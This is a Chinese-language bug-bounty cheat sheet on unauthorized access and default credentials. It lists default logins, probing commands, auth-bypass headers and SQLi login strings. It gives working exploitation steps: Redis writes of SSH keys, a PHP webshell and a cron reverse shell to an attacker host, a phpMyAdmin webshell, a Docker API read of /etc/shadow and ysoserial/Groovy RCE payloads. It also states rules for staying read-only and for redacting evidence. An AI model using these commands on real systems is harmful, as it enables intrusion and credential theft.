# 未授权访问 / 默认凭据

> 视角：黑盒，假定只有 URL，无源码
> WooYun 库 88,636 漏洞中 **14,377 (16.2%)** 是未授权访问——这是猎手最容易开胡的牌

## 1. 一句话说清

未授权访问 = "服务该有鉴权但没有"或"鉴权可被绕过"。
SRC 关注：**入口最浅、影响最重**——单个 IP 扫描 + 一次 curl 即可拿数据/RCE。

---

## 2. 高频入口点（统计 + 端口）

### 2.1 中间件管理面

| 服务 | 默认端口 | 默认路径 | 默认凭据 |
|------|---------|---------|---------|
| Tomcat | 8080 | `/manager/html`、`/host-manager/html` | `tomcat/tomcat`、`admin/admin` |
| WebLogic | 7001 | `/console/`、`/wls-wsat/` | `weblogic/weblogic`、`weblogic/weblogic1`、`weblogic/12345678`、`system/password` |
| JBoss | 8080 | `/jmx-console/`、`/web-console/`、`/invoker/JMXInvokerServlet` | `admin/admin` |
| Resin | 8080 | `/resin-admin/` | - |
| Spring Boot Actuator | 8080 | `/actuator/env`、`/actuator/heapdump`、`/actuator/mappings`、`/actuator/health` | 通常无 |
| Jenkins | 8080 | `/script`、`/manage` | 多数无 / `admin/admin` |
| Zabbix | 80/8080 | `/zabbix/` | `Admin/zabbix` |
| Grafana | 3000 | `/login` | `admin/admin` |
| Kibana | 5601 | `/` | 通常无 |
| phpMyAdmin | 80 | `/phpmyadmin/`、`/pma/`、`/myadmin/` | `root/`、`root/root` |

### 2.2 数据库 / 缓存服务

| 服务 | 端口 | 验证命令 | 危害 |
|------|------|---------|------|
| Redis | 6379 | `redis-cli -h IP info` | 写 SSH 公钥 / Webshell / 计划任务 → RCE |
| MongoDB | 27017 | `mongo IP:27017 --eval "db.version()"` | 全量数据导出 |
| Memcached | 11211 | `echo "stats" \| nc IP 11211` | 数据 + DDoS 反射 |
| Elasticsearch | 9200 | `curl IP:9200/_cat/indices` | 全索引数据 + Groovy RCE（旧版） |
| MySQL | 3306 | `mysql -h IP -u root` | 弱口令 / 空口令 |
| ZooKeeper | 2181 | `echo stat \| nc IP 2181` | 配置泄露 |
| Etcd | 2379 | `curl IP:2379/v2/keys/?recursive=true` | 配置 + token |
| Docker Remote API | 2375 | `curl IP:2375/info` | 容器逃逸 → 宿主 RCE |
| Kubelet | 10250/10255 | `curl -k https://IP:10250/pods` | 集群接管 |
| rsync | 873 | `rsync IP::` | 整站源码 |
| FTP | 21 | `ftp IP` 然后 `anonymous` | 匿名访问 |
| Hadoop YARN | 8088 | `/cluster` | 提交 job → RCE |

### 2.3 API / 文档暴露

```
/swagger-ui.html           /swagger-ui/
/swagger/index.html        /v2/api-docs
/api-docs                  /openapi.json
/api/v1/admin_is_login     /api/configs
/api/debug                 /actuator/env
/.env                      /metrics（Prometheus）
```

### 2.4 IoT / 摄像头默认凭据

| 设备 | 默认账号密码 |
|------|------------|
| 摄像头通用 | admin/admin、admin/12345、admin/123456、root/admin |
| 海康威视 | admin/12345 |
| 大华 | admin/admin |
| 路由器 | admin/admin、admin/password |
| 电信家庭网关 | telecomadmin/nE7jA%5m（固化无法改） |

---

## 3. 探测手法

### 3.1 服务级指纹（一行命令）

```bash
nmap -sV -p 21,80,443,873,2181,2375,2379,3000,3306,5601,6379,7001,8080,8088,8443,9200,10250,11211,27017 target

# 或针对一个站点
shodan host IP
fofa "ip=\"target\""
```

### 3.2 单服务一键探针

```bash
# Redis 未授权
redis-cli -h target ping        # 返回 PONG → 未授权
redis-cli -h target info        # 拉信息

# Mongo
mongo target:27017 --eval "db.adminCommand('listDatabases')"
mongoexport -h target -d <db> -c <coll> -o out.json

# ES
curl -s http://target:9200/_cat/indices?v
curl -s "http://target:9200/_search?pretty&size=10"

# Docker
curl -s http://target:2375/containers/json
curl -s http://target:2375/info

# rsync
rsync target::
rsync -avz target::module ./local/

# Memcached
echo -e "stats\nquit" | nc target 11211

# ZooKeeper
echo stat | nc target 2181

# Spring Actuator
for p in env heapdump mappings beans configprops trace logfile; do
  curl -s -o /dev/null -w "%{http_code} $p\n" http://target/actuator/$p
done
```

### 3.3 后台 / Web 管理面

```bash
# 自带字典
ffuf -u http://target/FUZZ -w admin-paths.txt -mc 200,302,401

# 关键 path（基于 WooYun 案例的高命中表）
admin/   admin.php   admin/index.php   admin/login.aspx
manage/  manage.php  manager/html      console/
jmx-console/   web-console/
phpmyadmin/    pma/   myadmin/
console/login/LoginForm.jsp
swagger-ui.html   swagger/   api-docs
actuator/   actuator/env
debug/      test/   dev/
```

### 3.4 默认凭据枚举（限速！）

```bash
# Hydra（注意速率，否则违规）
hydra -L users.txt -P pass.txt -t 4 -W 2 target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# 限制：一般限定 50 次/小时，不要无脑爆破
```

---

## 4. Bypass 矩阵（拿到登录页之后的事）

| 防护 | 绕过 |
|------|------|
| IP 白名单 | `X-Forwarded-For`、`X-Real-IP`、`X-Originating-IP`、`X-Client-IP`、`X-Remote-IP`、`X-Remote-Addr`、`Client-IP`、`Forwarded: for=127.0.0.1` |
| Host 白名单 | `Host: localhost`、`Host: 127.0.0.1`、双 Host header |
| 路径鉴权 | `/admin` 拦 → `/admin/`、`/admin/.`、`//admin`、`/admin;param`、`/Admin`、`%2fadmin`、`/api/../admin` |
| Method 限制 | GET 拦 → 试 POST / OPTIONS / `X-HTTP-Method-Override: GET` |
| Referer 校验 | 加 `Referer: https://target/admin` |
| 验证码爆破 | 验证码不刷新 → 固定验证码爆破密码 |
| 万能密码 | `' or '1'='1`、`admin'--`、`admin'#`、`admin"#` |
| 前端鉴权 | 禁用 JS、删除前端跳转代码、直接访问目标页 URL |
| 加密 cookie | 看是否有"统一加密密钥"问题（同一 CMS 全网通用密钥） |

参考 WooYun 案例：
- 赣企建站系统 `lstate=515csmxSi1aTO9ysxvJ1Gpmnj7hHuPxjMdfZdEP49lJZ`（统一密钥）
- 58 同城 Tomcat `admin:admin123456`
- Base64 路径 `/ZmptY2NtYW5hZ2Vy/`（解码 → 管理路径）

---

## 5. 利用提权 / 横向

### 5.1 Redis 未授权 → RCE 三板斧

```bash
# 1. 写 SSH 公钥
redis-cli -h target
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set x "\n\nssh-rsa AAAA...你的公钥...\n\n"
> save

# 2. 写 Webshell（需知道 web 根 + 写权限）
> config set dir /var/www/html/
> config set dbfilename shell.php
> set x "<?php @eval($_POST['c']);?>"
> save

# 3. 计划任务反弹（Centos）
> config set dir /var/spool/cron/
> config set dbfilename root
> set x "\n\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> save
```

### 5.2 Tomcat / WebLogic / JBoss → 部署 WAR

```
1. 默认凭据登录管理面
2. 上传 webshell.war / 配合 deploy 接口
3. 访问 /shell/cmd.jsp 触发
```

### 5.3 Spring Actuator heapdump → 数据库密码

```bash
curl http://target/actuator/heapdump -o heap.bin
# 用 Eclipse MAT / vsheap 分析，搜索 datasource、password、jdbc
strings heap.bin | grep -iE "(password|jdbc|secret|key)" | sort -u
```

### 5.4 phpMyAdmin → Webshell

```sql
-- 写文件（需 FILE 权限 + secure_file_priv 为空）
SELECT '<?php @eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/x.php';
```

### 5.5 IDOR / ID 枚举 → 大面积数据

```python
import requests
for i in range(1, 100000):
    r = requests.get(f"http://target/api/user/{i}", timeout=3)
    if r.status_code == 200:
        # 仅取 10 条样本即可证明，不要拖库
        print(i, r.text[:100])
        if i > 10:
            break
```

---

## 6. 真实案例指纹（CVE / wooyun）

| 漏洞 | 指纹（黑盒） | 探针 |
|------|-------------|------|
| **wooyun-2015-0108547 监控设备** | 直接访问 `/admin/index.jsp` 进入后台 | `curl http://target/admin/index.jsp` 看是否返回管理界面 |
| **WebLogic CVE-2017-10271** | `/wls-wsat/CoordinatorPortType` 返回 SOAP fault | XMLDecoder gadget POST → RCE |
| **WebLogic CVE-2019-2725** | `/_async/AsyncResponseService` 可达 | 同上 |
| **JBoss JMXInvokerServlet** | `/invoker/JMXInvokerServlet` 200 + `application/x-java-serialized-object` | ysoserial 反序列化 |
| **WebLogic T3 反序列化** | 7001 端口 nmap 看到 t3 | `java -jar ysoserial.jar CommonsCollections1 "id" \| nc target 7001` |
| **ES Groovy RCE (CVE-2014-3120)** | ES 1.x，`/_search` 支持 `script_fields` | `{"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec(\"id\")"}}}` |
| **Spring Boot Heapdump 泄露** | `/actuator/heapdump` 200 返回二进制 | `curl /actuator/heapdump -o heap.bin` |
| **Hadoop YARN REST API RCE** | `/ws/v1/cluster/apps/new-application` | POST 提交 job |
| **Docker Remote API** | 2375 开放 | `docker -H tcp://target:2375 run -v /:/host alpine cat /host/etc/shadow` |
| **Kubelet 10250 unauth** | `https://target:10250/pods` 200 | `kubectl --insecure-skip-tls-verify exec ...` |
| **CouchDB Fauxton** | 5984 + `/_utils/` | 创建 admin 用户 |
| **RabbitMQ Management** | 15672 + `guest/guest` | 默认账号 |

---

## 7. 复现 / 证据要点

### 7.1 报告 HTTP 包模板

```http
GET /actuator/env HTTP/1.1
Host: target.com
User-Agent: curl/8.0
Accept: */*

HTTP/1.1 200 OK
Content-Type: application/vnd.spring-boot.actuator.v3+json
Content-Length: 18743

{"activeProfiles":["prod"],"propertySources":[{"name":"applicationConfig: ...","properties":{"spring.datasource.password":{"value":"******"}, ...}}]}
```

注意：响应中**敏感数据用 `******` 替换 4 字符以上的字符串**，但保留键名和结构。

### 7.2 CVSS vector 参考

```
未授权 RCE          CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
未授权数据导出       CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 High
未授权管理后台       CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1 Critical
默认凭据后台         CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
```

### 7.3 影响段写法

```
通过未授权访问 /actuator/heapdump 接口，攻击者无需任何凭证即可下载完整
JVM 堆转储文件（约 200MB），其中包含 spring.datasource.password、
jwt.secret、redis.password 等关键凭证。攻击者可凭这些凭证：
1. 直连数据库导出全量用户数据；
2. 伪造任意用户 JWT token，获得管理员权限；
3. 横向移动至 Redis、MQ 等配套组件。

样本证明（已脱敏）：
spring.datasource.url=jdbc:mysql://10.0.x.x:3306/****
spring.datasource.password=****1234
（完整证据见附件 heapdump-strings.txt）
```

---

## 8. 不要做的事

- **禁**：用 Redis/Mongo 写马、留 webshell、上 cron。**只做读类证明**：`info`、`ping`、`db.version()`、`listDatabases`。需要写文件验证时，写一个明显是 PoC 的文件名（`poc-2025-05-09.txt`），并立即清理。
- **禁**：从 Mongo / ES 拖出超过 10 条用户记录。取 1–3 条脱敏即可。
- **禁**：用默认凭据登录 + 使用功能（创建用户、删除数据）。仅证明可登录后立即退出。
- **禁**：扫描 `/16` 以上的网段。
- **禁**：把 heapdump、备份文件传到第三方网盘。本地保存，报告后删除。
- **限速**：path fuzzing 1–5 rps，一台机器，不并发。
- **报告时**脱敏：内网 IP、域名、用户名、手机号、邮箱、token。

## H1 真实案例

_共 46 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | 15300 usd | PayPal | [Token leak in security challenge flow allows retrieving victim's PayPal email and plain text pass…](https://hackerone.com/reports/739737) | Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password |
| Critical | — | Starbucks | [JumpCloud API Key leaked via Open Github Repository.](https://hackerone.com/reports/716292) | Summary:** Open Github Repo Leaking Starbucks JumbCloud API Key Description:** Team, While going through Github search I discov… |
| Critical | 12500 usd | LY Corporation | [Spring Actuator endpoints publicly available and broken authentication](https://hackerone.com/reports/838635) | Spring Actuator endpoints publicly available and broken authentication |
| High | 12500 usd | HackerOne | [Internal Access to Hackerone confluence Docs](https://hackerone.com/reports/3113398) | Internal Access to Hackerone confluence Docs |
| High | — | GitLab | [Ability To Delete User(s) Account Without User Interaction](https://hackerone.com/reports/928255) | Summary: Gitlab allows its user to exercise their GDPR rights (Right to Access/Delete) user data by sending an email to gdpr-re… |
| Critical | 5000 usd | LY Corporation | [Spring Actuator endpoints publicly available, leading to account takeover](https://hackerone.com/reports/862589) | Spring Actuator endpoints publicly available, leading to account takeover |
| High | — | LinkedIn | [Session Cookie Leakage via Static Header Field in WebViewerFragment](https://hackerone.com/reports/3475626) | Hello LinkedIn Security Team, I was able to identify a vulnerability in the `WebViewerFragment` that can lead to leaking the us… |
| Critical | 1000 usd | U.S. Dept Of Defense | [Wordpress Takeover using setup configuration at http://████.edu [HtUS]](https://hackerone.com/reports/1626205) | Description: The WordPress 'setup-config.php' installation page allows users to install WordPress in local or remote MySQL data… |
| High | — | Stripe | [Mass account takeover!](https://hackerone.com/reports/1634165) | Mass account takeover! |
| High | — | Equifax-vdp | [Important information leaked on Github](https://hackerone.com/reports/649322) | While searchin on Github about Equifax i found some juicy information like a username and password of this subdomain (https://t… |
| High | — | EXNESS | [Unrestricted Access to Celery Flower Instance](https://hackerone.com/reports/2264960) | Hi Team, The Celery Flower instance is running and publicly accessible via the PIM mobile route /pim/flower/* |

**命中本类的 weakness 分布：**

- Misconfiguration：18 条
- Uncategorized → 手工归类：16 条
- Use of Hard-coded Credentials：6 条
- Missing Authentication for Critical Function：2 条
- Security Through Obscurity：2 条
- Use of Default Credentials：1 条
- Use of Hard-coded Password：1 条
